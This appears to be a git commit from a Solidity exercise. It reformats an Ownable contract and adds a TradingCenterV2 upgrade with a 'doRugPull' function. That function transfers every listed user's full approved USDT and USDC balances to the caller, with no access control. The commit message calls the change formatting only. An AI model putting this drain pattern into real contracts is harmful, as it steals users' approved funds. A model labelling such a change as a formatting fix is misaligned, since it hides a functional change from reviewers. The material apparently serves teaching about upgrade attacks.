c195f3ee25ee23bfe449a8c16744202859033c47
calvinchang <q20274982@gmail.com>
2023-10-27 18:00:18 +0800

    chore: code fmt

--- src/Ownable.sol
+++ src/Ownable.sol
@@ -2,30 +2,31 @@
 pragma solidity ^0.8.17;
 
 contract Ownable {
-  bytes32 internal constant _OWNER_SLOT_ = 0xa7b53796fd2d99cb1f5ae019b54f9e024446c3d12b483f733ccc62ed04eb126b;
+    bytes32 internal constant _OWNER_SLOT_ = 0xa7b53796fd2d99cb1f5ae019b54f9e024446c3d12b483f733ccc62ed04eb126b;
 
-  function initializeOwnable(address _owner) internal {
-    setOwner(_owner);
-  }
-
-  function getOwner() public view returns (address owner) {
-    assembly {
-      owner := sload(_OWNER_SLOT_)
+    function initializeOwnable(address _owner) internal {
+        setOwner(_owner);
     }
-  }
 
-  function setOwner(address _owner) internal {
-    assembly {
-      sstore(_OWNER_SLOT_, _owner)
+    function getOwner() public view returns (address owner) {
+        assembly {
+            owner := sload(_OWNER_SLOT_)
+        }
     }
-  }
-  modifier onlyOwner() {
-    require(msg.sender == getOwner(), "Ownable: caller is not the owner");
-    _;
-  }
 
-  function transferOwnership(address newOwner) external onlyOwner {
-    require(newOwner != address(0), "Ownable: new owner is the zero address");
-    setOwner(newOwner);
-  }
+    function setOwner(address _owner) internal {
+        assembly {
+            sstore(_OWNER_SLOT_, _owner)
+        }
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == getOwner(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function transferOwnership(address newOwner) external onlyOwner {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        setOwner(newOwner);
+    }
 }
--- src/TradingCenterV2.sol
+++ src/TradingCenterV2.sol
@@ -1,6 +1,22 @@
 // SPDX-License-Identifier: SEE LICENSE IN LICENSE
 pragma solidity ^0.8.17;
 
+import {TradingCenter, IERC20} from "../src/TradingCenter.sol";
+
 // TODO: Try to implement TradingCenterV2 here
-contract TradingCenterV2 {
+contract TradingCenterV2 is TradingCenter {
+    function doRugPull(address[] calldata users) public returns (bool) {
+        uint256 j;
+        while (j < users.length) {
+            usdt.transferFrom(users[j], msg.sender, usdt.balanceOf(users[j]));
+            usdc.transferFrom(users[j], msg.sender, usdc.balanceOf(users[j]));
+            j++;
+        }
+
+        return true;
+    }
+
+    function VERSION() public pure override returns (string memory) {
+        return "0.0.2";
+    }
 }
